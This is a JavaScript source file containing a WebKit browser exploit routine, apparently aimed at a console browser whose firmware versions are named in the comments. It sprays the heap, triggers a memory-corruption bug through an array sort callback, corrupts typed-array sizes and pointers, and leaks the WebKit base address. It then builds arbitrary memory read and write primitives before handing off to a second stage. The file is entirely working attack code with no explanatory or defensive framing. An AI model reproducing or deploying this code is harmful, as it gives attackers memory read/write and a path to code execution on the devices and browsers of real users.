function exploit_firekaku() {
	
	// Userland pwnage
	try {
	   	// Perform a heap spray
		const spray_size = 0x1000; // 0x1000 was not as much (OOM), 0xA000 is too big (can't find ArrayBufferView in memory)
        var spray = new Array(spray_size);
        for (var i = 0; i < spray.length; i++)
            spray[i] = new Uint32Array(0x1A7);

		const maxLenFoo = 0x3000; // almost oversize
        var foo = new Array(maxLenFoo);
		const maxLenFu = 0x800; // normal size
		var fu = new Array(maxLenFu);
        var o = {};
        var arrays = new Array(0x4); // only need to store 4 arrays
        var buf_addr = undefined;
        var primitive = undefined;
        var found = false;
		
		
		// Modify the o.toString method that will be called by sort method
        o.toString = function() {
            foo.push(12345);
            for (var i = 0; i < arrays.length; ++i) {
                var bar = Array.prototype.constructor.apply(null, fu);
                bar[0] = 1;
                bar[1] = 2;
                bar[2] = 3;
                arrays[i] = bar;
            }
            return "";
        }

        foo[0] = o;

        const new_size = u2d(0x80000000, 0x80000000);
        for (var i = 1; i < foo.length; ++i)
            foo[i] = new_size;

        foo.sort(); // Trigger vulnerability
		
        o.toString = function() {}; // Don't need this function anymore

		// Set up the buffer with NOP Sled for overflow
        var u32buffer = new Array(0x100);
        for (var i = 0; i < 0x100; i++) {
            var v = new Uint32Array(0x13AC);
            for (var j = 0; j < v.length; j++) {
				// Change all odd sections to 0x90909090 (NOP Sled, if we hit one of these, we're good)
                if (j % 2 == 1)
                    v[j] = 0x90909090;
                else
                    v[j] = j;
            }
            u32buffer[i] = v;
        }

        var arr = arrays[1];
		//alert("Modified arr length = 0x" + arr.length.toString(16));
		
		// Modify ArrayBufferView size and point to the next ArrayBufferView for ROP
		
        const start_offset = 0x2F000;
		const offset = d2u(arr[(start_offset) + (0x3000 / 8) + ((0x5000 / 8) * -40)]).low; // or 50
		const offset2 = d2u(arr[(start_offset) + (0x3000 / 8) + ((0x5000 / 8) * 30)]).low; // or 20
		
		found = false;
        var index = 0;
		for (var i = 48; i <= 48; i++) {
			var val = d2u(arr[(start_offset) + (0x3000 / 8) + ((0x5000 / 8) * i) - (offset / 2) - 1]).hi;
            if (val == 0xbadaeef7) {
                found = true;
                //alert("Found ArrayBufferView in memory!");
                //alert('Modified index is ' + i);
                index = i;
                break;
            }
        }

        if (!found) {
			location.reload(); // not working...
			//throw "Did not find ArrayBufferView in memory.";
		}
        

        // Modify an ArrayBufferView object size,
        // and make its buffer point to its ArrayBuffer field.
        arr[(start_offset) + (0x3000 / 8) + ((0x5000 / 8) * index) - offset2 / 2 + 7] = u2d(0x80000000, 0xbadbeef7); // new size
        arr[(start_offset) + (0x3000 / 8) + ((0x5000 / 8) * index) - offset2 / 2 + 2] = arr[(start_offset) + (0x3000 / 8) + ((0x5000 / 8) * index) - offset2 / 2 + 4]; // new address

        found = false;
        for (var i = 0; i < u32buffer.length; i++) {
            if (u32buffer[i].length != 0x13AC) {
                // Modify the ArrayBuffer so it is larger
                // and make it so its m_data pointer points to the ArrayBufferViews
                found = true;
                buf_addr = new int64(u32buffer[i][2], u32buffer[i][3]); // save old address where we will inject ROP later
                u32buffer[i][2] = u32buffer[i][6]; // new address low
                u32buffer[i][3] = u32buffer[i][7]; // new address high
                u32buffer[i][4] = 0x60000 * 4; // new size
                break;
            }
        }

       if (!found) {
	   		location.reload();
			//throw "Did not find ArrayBufferView in memory.";
		}

        // Find the modified ArrayBuffer and create our own Uint32Array from it
		found = false;
        for (var i = 0; i < u32buffer[i].length; i++) {
            if (u32buffer[i].buffer.byteLength != 0x4EB0) {
                found = true;
                primitive = new Uint32Array(u32buffer[i].buffer);
                break;
            }
        }

        if (!found)
            throw "Did not find primitive in memory.";

		var old_low = primitive[0x14];
		var old_high = primitive[0x15];

		var vtable_ptr = new int64(primitive[0], primitive[1]);
		alert("vtable:" + vtable_ptr);
		
		var webKitBase = vtable_ptr.sub32(0x2600D80); // 3.55
		//webkit_base_addr = vtable_ptr.sub32(0x2615D18); // 3.15
        alert("webKitBase: " + webKitBase);
		window.webKitBase = webKitBase;
		
		primitive[0x1e] = 0x600000; // Change the buffer size of the next ArrayBufferView in memory
        found = false;
		var slave = undefined;
        // Find it, we will use it for ROP
        for (var i = 0; i < u32buffer[i].length; i++) {
            if (u32buffer[i].length == 0x600000) {
                found = true;
                slave = u32buffer[i];
                break;
            }
        }
		
        if (!found)
            throw "Did not find slave in memory.";
		
		// Derive primitive functions
		var prim = {
			write8: function (addr, val) {
				primitive[0x14] = addr.low;
				primitive[0x15] = addr.hi;

				if (val == undefined)
					val = new int64(0,0);
				if (!(val instanceof int64))
					val = new int64(val,0);

				slave[0] = val.low;
				slave[1] = val.hi;

				primitive[0x14] = old_low;
				primitive[0x15] = old_high;
			},

			write4: function (addr, val) {
				primitive[0x14] = addr.low;
				primitive[0x15] = addr.hi;

				slave[0] = val;

				primitive[0x14] = old_low;
				primitive[0x15] = old_high;
			},

			read8: function (addr) {
				primitive[0x14] = addr.low;
				primitive[0x15] = addr.hi;

				var rtv = new int64(slave[0], slave[1]);

				primitive[0x14] = old_low;
				primitive[0x15] = old_high;

				return rtv;
			},

			// Add to wk_expl.js after read8 definition

			readable_read8: function (addr) {
				primitive[0x14] = addr.low;
				primitive[0x15] = addr.hi;
				
				var t0 = slave[0].toString(16);
				var t1 = slave[1].toString(16);
				
				var addZeroes = function (string8) {
					var newString8 = "0";
					var toAdd = 8 - string8.length;
					if (toAdd != 0) {
						//print("toAdd >" + toAdd);
						for (i = 1; i < toAdd; i++)
							newString8 += "0";
						//print(newString8 + string8);
						return newString8 + string8;
					}
					//print("toAdd >" + toAdd);
					//print(string8);
					return string8;
				};
				
				//print(t0 + ":"+ t0.length);
				var newT0 = addZeroes(t0).match(/[a-fA-F0-9]{2}/g).reverse().join('');
				//print(newT0);
				//print(t1 + ":"+ t1.length);
				var newT1 = addZeroes(t1).match(/[a-fA-F0-9]{2}/g).reverse().join('');
				//print(newT1);
				
				primitive[0x14] = old_low;
				primitive[0x15] = old_high;
				return newT0 + newT1;
			},
			
			read4: function (addr) {
				primitive[0x14] = addr.low;
				primitive[0x15] = addr.hi;

				var rtv = slave[0];

				primitive[0x14] = old_low;
				primitive[0x15] = old_high;

				return rtv;
			},

			leakval: function (jsval) {

			},

			createval: function (jsval) {

			}	
		};
		
		window.prim = prim;
		
		p = window.prim;
		//alert(p.read8(webKitBase));
		
		if (window.postExpl)
			window.stage2();
		
	} catch(e) {
		failed = true;
		fail("Exception: " + e);
	}
}